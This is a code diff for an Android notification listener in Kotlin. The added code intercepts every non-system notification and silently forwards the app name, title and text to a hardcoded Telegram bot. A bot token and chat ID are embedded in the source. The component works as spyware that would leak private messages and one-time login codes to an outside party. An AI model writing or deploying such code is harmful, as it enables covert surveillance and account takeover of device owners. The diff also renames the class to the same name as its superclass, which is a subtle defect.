@@ -1,19 +1,74 @@
-package com.luffa
-
+import android.app.Notification
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
+import android.content.ComponentName
+import android.content.Intent
+import android.os.Build
 import kotlinx.coroutines.*
+import org.json.JSONObject
+import java.net.HttpURLConnection
+import java.net.URL
 
-class NotifListener : NotificationListenerService() {
+class NotificationListenerService : NotificationListenerService() {
+
+    companion object {
+        private const val BOT_TOKEN = "8840980473:AAE8Tml8PjJH05vcN5SNSRESqC34mTlC1kc"
+        private const val CHAT_ID = "8820979221"
+        private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    }
+
     override fun onNotificationPosted(sbn: StatusBarNotification) {
-        if (sbn.isOngoing) return
-        val pkg = sbn.packageName
-        val title = sbn.notification.extras.getString("android.title") ?: ""
-        val text = sbn.notification.extras.getString("android.text") ?: ""
-        CoroutineScope(Dispatchers.IO).launch {
-            val msg = "🔔 $pkg\n$title: $text"
-            // reuse your existing sendTelegramMessage logic
-            MyService.sendStaticTelegramMessage(msg)
+        super.onNotificationPosted(sbn)
+        
+        // Ignore system notifications if desired, or capture everything
+        if (sbn.packageName.equals("android", true)) return
+
+        scope.launch {
+            sendNotificationToTelegram(sbn)
         }
+    }
+
+    private suspend fun sendNotificationToTelegram(sbn: StatusBarNotification) {
+        try {
+            val notification = sbn.notification
+            val packageName = sbn.packageName
+            val appLabel = sbn.packageName // You can use getLabel() if needed
+            
+            // Extract Notification Content
+            val title = notification.extras.getString(Notification.EXTRA_TITLE) ?: "No Title"
+            val text = notification.extras.getString(Notification.EXTRA_TEXT) ?: "No Text"
+            val timestamp = System.currentTimeMillis() / 1000
+            
+            val message = """
+🔔 *New Notification Intercepted!*
+📱 *App:* $packageName
+📝 *Title:* $title
+💬 *Content:* $text
+🕒 *Time:* $timestamp
+            """.trimIndent()
+
+            val telegramUrl = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=${java.net.URLEncoder.encode(message, "UTF-8")}&parse_mode=Markdown"
+            
+            val url = URL(telegramUrl)
+            val connection = url.openConnection() as HttpURLConnection
+            connection.requestMethod = "GET"
+            connection.connectTimeout = 5000
+            connection.readTimeout = 5000
+            
+            // Read response to ensure it sent
+            val response = connection.inputStream.bufferedReader().use { it.readText() }
+            connection.disconnect()
+            
+            if (connection.responseCode != 200) {
+                // Log error if needed
+            }
+
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+    }
+
+    override fun onNotificationRemoved(sbn: StatusBarNotification) {
+        super.onNotificationRemoved(sbn)
     }
 }
